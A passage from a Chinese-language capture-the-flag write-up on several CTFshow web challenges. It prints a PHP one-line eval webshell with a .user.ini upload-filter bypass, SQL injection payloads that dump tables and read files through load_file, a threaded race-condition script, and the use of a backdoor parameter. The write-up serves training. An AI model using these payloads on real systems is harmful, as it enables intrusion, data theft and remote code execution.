&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p> 这里要求文件的字符数要不大于24 名字不大于9个字符 后缀不大于3个字符 而且不让上传php文件<br> 所以我们在a.txt中写入一句话木马，先<br>在 php 中 “.user.ini” 有如下解释：php 会在每个目录下搜寻文件名，如果设定为空字符串则 php 不会搜寻，也就是在 “.user.ini” 中如果设置了文件名，那么任意一个页面都将该文件中的内容包含进去。有两种方法：<br>auto_prepend_file: 在页面顶部加载文件<br>auto_append_file: 在页面底部加载文件<br>先写这个.user.ini文件并上传 然后再上传一句话木马的.txt文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#a.txt</span></span><br><span class="line">&lt;<span class="string">?=</span> <span class="variable">@eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="comment">#因为字符数限制，所以只能写这些</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#.user.ini</span></span><br><span class="line">auto_append_file=a.txt</span><br></pre></td></tr></table></figure></div>
<p>但是用蚁剑连接之后看不到数据，我们就用post请求传入a 用glob找到目录<br><img src="https://pic1.imgdb.cn/item/67ac63cdd0e0a243d4fe97f9.png" alt="|500"><br>然后再和web12一样用highlight_file()读取文件 (注意用单引号包裹文件)</p>
<h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;secret.php&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c </span>= <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);    <span class="title function_ invoke__">sleep</span>(<span class="variable">$c</span>);  </span><br><span class="line">    <span class="keyword">switch</span><span class="title function_ invoke__"> </span>(<span class="variable">$c</span>) &#123;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;$url&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;@A@&quot;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">6000000</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$url</span>&quot;</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>
<p>这里c参数选择3的时候，没有break，会继续向下执行<br>出现<code>@A@here_1s_your_f1ag.php@A@</code>提示 进入这个php 是一个登录界面<br>下一步就是sql注入了<br>查看源码 发现过滤的东西  空格也过滤了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">&lt;!--</span>|</span><br><span class="line">||<span class="string">if(preg_match(&#x27;/information_schema\.tables\</span>|<span class="string">information_schema\.columns\</span>|<span class="string">linestring\</span>|<span class="string"> \</span>|<span class="string">polygon/is&#x27;, $_GET[&#x27;query&#x27;]))&#123;</span>|</span><br><span class="line">||<span class="string">die(&#x27;@A@&#x27;);</span>|</span><br><span class="line">||<span class="string">&#125;</span>|</span><br><span class="line">||<span class="string">--&gt;</span>|</span><br></pre></td></tr></table></figure></div>
<p>空格的绕过我们学过，这里没有过滤反引号<br>反引号：它是为了区分 MYSQL 的保留字与普通字符而引入的符号。<br>接下来就是sql注入的部分了：<br>1.爆库：<code>-1/**/union/**/select/**/database();</code> 得到库名web<br>2.爆表：<code>-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.</code>tables<code>/**/where/**/table_schema=database();</code> 得到表名content<br>3.爆字段：<code>-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.</code>columns<code>/**/where/**/table_name=&#39;content&#39;;</code> 得到id,username,password<br>4.爆值： <code>-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/web.content;</code><br>没有直接给出flag但是给了一些提示<br><img src="/CTFshow.assets/image-20250204223159587.png"><br>提示secret  所以访问secret.php<br>要用load_file()函数读取这个文件<br><code>-1/**/union/**/select/**/load_file(&#39;/var/www/html/secret.php&#39;)</code> 但是坑爹的是，没有直接回显，查看源码发现有多了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">   </span>|</span><br><span class="line">|<span class="string">---</span>|</span><br><span class="line">|<span class="string">&lt;script&gt;alert(&#x27;&lt;!-- ReadMe --&gt;</span>|</span><br><span class="line">||<span class="string">&lt;?php</span>|</span><br><span class="line">||<span class="string">$url = &#x27;here_1s_your_f1ag.php&#x27;;</span>|</span><br><span class="line">||<span class="string">$file = &#x27;/tmp/gtf1y&#x27;;</span>|</span><br><span class="line">||<span class="string">if(trim(@file_get_contents($file)) === &#x27;ctf.show&#x27;)&#123;</span>|</span><br><span class="line">||<span class="string">echo file_get_contents(&#x27;/real_flag_is_here&#x27;);</span>|</span><br><span class="line">||<span class="string">&#125;&#x27;)&lt;/script&gt;</span>|</span><br></pre></td></tr></table></figure></div>
<p>所以再用load_file读 </p>
<h1 id="红包题第六弹"><a href="#红包题第六弹" class="headerlink" title="红包题第六弹"></a>红包题第六弹</h1><p>这题我感觉特别难，看着wp试着理解一下，首先这个题目给了一个登录界面，但是提示说不是sql注入需要找到关键源码。<br>扫一下网站的目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat /root/tmp/reports/https_f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/__<span class="number">25-02-05_15</span>-<span class="number">07</span>-<span class="number">10</span>.txt | grep &quot;.zip&quot;</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/vb.zip</span><br><span class="line"><span class="number">200</span>   <span class="number">576</span>B   https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/web.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/website.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/wordpress.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/wp-config.php.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/wp.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/wwwroot.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/www.zip</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/zipkin/</span><br></pre></td></tr></table></figure></div>
<p>搜索zip的文件，然后把这个web.zip下载下来 ， 这是网站源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveStreamFile</span>(<span class="params"><span class="variable">$receiveFile</span></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$streamData</span> = <span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])? <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$streamData</span>))&#123;</span><br><span class="line">        <span class="variable">$streamData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$streamData</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$receiveFile</span>, <span class="variable">$streamData</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>)) === <span class="variable">$token</span>)&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$receiveFile</span> = <span class="string">&#x27;flag.dat&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">receiveStreamFile</span>(<span class="variable">$receiveFile</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">md5_file</span>(<span class="variable">$receiveFile</span>)===<span class="title function_ invoke__">md5_file</span>(<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="variable">$receiveFile</span>)!=<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;success&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;人脸识别成功!<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;same file&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;md5 error&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;token error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure></div>
<p>可以看到中源码中有对token做判断。可以抓包看看，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/check.php?token=1f0e3dad99908345f7439f8ffabdffc4&amp;php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>f991d1d6-f578-4825-a048-004c12279240.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>27</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://f991d1d6-f578-4825-a048-004c12279240.challenge.ctf.show</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://f991d1d6-f578-4825-a048-004c12279240.challenge.ctf.show/vb.zip</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-nginx"><span class="attribute">username</span> or password <span class="literal">error</span>!</span></span><br></pre></td></tr></table></figure></div>
<p>发现在第一行这里确实跟了一个token 我解密出来这个md5对应的值是19<br>源码中的逻辑是设置了一个 receivefile 为 flag.dat，然后调用 receiveStreamFile($receiveFile);，可以发现是需要用 php:&#x2F;&#x2F;input 获取文件流，然后返回一个文件，接下来需要自己传上去的文件与已存在的 key.dat 的 MD5 要一致，sha512 不一致，即可打印出 flag<br>所以首先要获取这个key.dat 可以从url处直接下载  接下来我们上传的文件的md5要一样 sha512不一样 需要用python实现</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里为什么用分钟数生成：因为通过抓包发现改变分钟后token值才会变化</span></span><br><span class="line">i = <span class="built_in">str</span>(time.localtime().tm_min)</span><br><span class="line"><span class="comment"># 生成token</span></span><br><span class="line">m = hashlib.md5(i.encode()).hexdigest()</span><br><span class="line">url = <span class="string">&quot;https://ad0204ed-4869-4879-96b1-fa5681393cdb.challenge.ctf.show/check.php?token=&#123;&#125;&amp;php://input&quot;</span>.<span class="built_in">format</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;something went wrong!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/Users/kakeru/ctf/key.dat&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> t:</span><br><span class="line">    data1 = t.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=POST, args=(data1,)).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    data2 = <span class="string">&#x27;emmmmm&#x27;</span></span><br><span class="line">    threading.Thread(target=POST, args=(data2,)).start()</span><br></pre></td></tr></table></figure></div>
<h1 id="红包题第七弹"><a href="#红包题第七弹" class="headerlink" title="红包题第七弹"></a>红包题第七弹</h1><p><img src="https://pic1.imgdb.cn/item/67ac63a3d0e0a243d4fe97df.png"><br>题目就给了一个phpinfo的界面，没有什么信息，用dirsearch扫描一下目录 扫一下PHP文件<br>这题考查的是.git泄漏   目录扫描之后会找到一个&#x2F;.git&#x2F;index文件<br>在linux中查看这个index的内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">DIRC</span>^J??<span class="number">9</span>??^Jw?!&#x27;???U??<span class="number">0</span>wQW?<span class="number">8</span>??&gt;&amp;?=??&lt;&lt;</span><br><span class="line"></span><br><span class="line">                                       <span class="attribute">backdoor</span>.php^J??<span class="number">8</span>?ь^Jw? ?<span class="number">1</span>???Am<span class="string">&quot;?~?]?I???t? ??? index.phpTREE2 0</span></span><br></pre></td></tr></table></figure></div>
<p>有一个backdoor.php文件，去看看是什么</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 36D姑娘留的后门，闲人免进 --&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>页面返回内容是这个，说明有个后门，但是不知道具体什么，这里后门是英文单词的后门Letmein （不知道怎么得到的）<br>hackbar post传入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Letmein</span><span class="operator">=</span>print_r (glob (<span class="string">&quot;*&quot;</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>
<p>得到<code>Array ( [0] =&gt; backdoor.php [1] =&gt; index.php )</code><br>用蚁剑连接之后在&#x2F;var&#x2F;www目录下面有flag.txt<br><img src="https://pic1.imgdb.cn/item/67ac65efd0e0a243d4fe9925.png" alt="|500"><br>用hackbar中手动用highlight_file查看 得到flag<br><img src="https://pic1.imgdb.cn/item/67ac65f6d0e0a243d4fe9929.png" alt="|475"></p>
<h1 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h1><p>bp抓包然后爆破密码 得到密码之后登录<br><img src="https://pic1.imgdb.cn/item/67ac6606d0e0a243d4fe992d.png"></p>
<p>在页面的网络中有一个flag请求头，然后base64解码就能得到flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> <span class="string">&quot;Y3Rmc2hvd3tjZTBhNmI3Ni1jMGQxLTQyNWMtYjU0NC0yOTg5ZmVmNmFjZTN9&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line"></span><br><span class="line">ctfshow&#123;ce0a6b76-c0d1-425c-b544-2989fef6ace3&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h1><p>题目还是一个登录界面，但是可以注册，注册一个账号登录进去，有显示一个flag的信息<br><img src="https://pic1.imgdb.cn/item/67ac65fcd0e0a243d4fe992b.png"><br>但是没有什么多余信息<br>用dirsearch扫到一个<a href="http://www.zip/">www.zip</a> 下载下来就是网页的源代码<br>login.php这个源码中显示禁了很多字符，所以无法sql注入<br>在user_main.php中有关键代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="operator">?</span>php</span><br><span class="line">    <span class="keyword">if</span> (isset($_SESSION[<span class="string">&quot;login&quot;</span>]) <span class="operator">&amp;&amp;</span> $_SESSION[<span class="string">&quot;login&quot;</span>] <span class="operator">==</span><span class="operator">=</span> <span class="literal">true</span>) &#123;</span><br><span class="line">        $con <span class="operator">=</span> mysqli_connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;web15&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="operator">!</span>$con) &#123;</span><br><span class="line">            die(&#x27;Could not <span class="params">connect:</span> &#x27; . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $order <span class="operator">=</span> $_GET[&#x27;order&#x27;];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($order) <span class="operator">&amp;&amp;</span> strlen($order) <span class="operator">&lt;</span> <span class="number">6</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|<span class="char escape_">\,</span>|<span class="char escape_">\`</span>|<span class="char escape_">\~</span>|<span class="char escape_">\!</span>|<span class="char escape_">\@</span>|<span class="char escape_">\#</span>|<span class="char escape_">\%</span>|<span class="char escape_">\^</span>|<span class="char escape_">\&amp;</span>|<span class="char escape_">\*</span>|<span class="char escape_">\(</span>|<span class="char escape_">\)</span>|<span class="char escape_">\（</span>|<span class="char escape_">\）</span>|<span class="char escape_">\-</span>|<span class="char escape_">\_</span>|<span class="char escape_">\+</span>|<span class="char escape_">\=</span>|<span class="char escape_">\&#123;</span>|<span class="char escape_">\&#125;</span>|<span class="char escape_">\[</span>|<span class="char escape_">\]</span>|<span class="char escape_">\;</span>|<span class="char escape_">\:</span>|<span class="char escape_">\&#x27;</span>|<span class="char escape_">\’</span>|<span class="char escape_">\“</span>|<span class="char escape_">\&quot;</span>|<span class="char escape_">\&lt;</span>|<span class="char escape_">\&gt;</span>|<span class="char escape_">\?</span>|<span class="char escape_">\,</span>|<span class="char escape_">\.</span>|<span class="char escape_">\?</span>/i&quot;</span>, $order)) &#123;</span><br><span class="line">                die(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $sql <span class="operator">=</span> <span class="string">&quot;select * from user order by $order&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $sql <span class="operator">=</span> <span class="string">&quot;select * from user order by id&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="operator">?</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>如果我们把order&#x3D;pwd，就可以一直注册，根据密码排序，得到flag。<br>因为这里用orderby排序了，所以可以让我们注册的密码和flag的密码进行比较<br>一段来自网上的脚本:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"> import requests</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://69ffa319-8ced-4173-8a89-71f4446243aa.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def reg(password):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: password, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = requests.post(<span class="attribute">url</span>=url + <span class="string">&quot;reg.php&quot;</span>, <span class="attribute">data</span>=data, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == 302:</span><br><span class="line">        return <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login(username, password):</span><br><span class="line">    #<span class="built_in"> proxy </span>= &#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: 